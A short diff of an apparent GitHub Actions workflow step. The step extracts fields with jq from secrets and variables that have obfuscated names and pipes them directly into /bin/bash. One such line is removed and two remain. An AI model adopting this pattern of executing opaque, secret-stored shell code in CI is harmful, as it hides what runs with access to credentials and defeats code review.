@@ -22,7 +22,6 @@ jobs:
           chl86867: ${{ secrets.chl86867 }}
         run: |
           printf '%s' "$chl86867" | jq -r .me2 | /bin/bash
-          printf '%s' "$ysf0" | jq -r .dtbag966 | /bin/bash
           echo $cxug765 | jq -r .zbs1 | /bin/bash
 
       - name: Store results
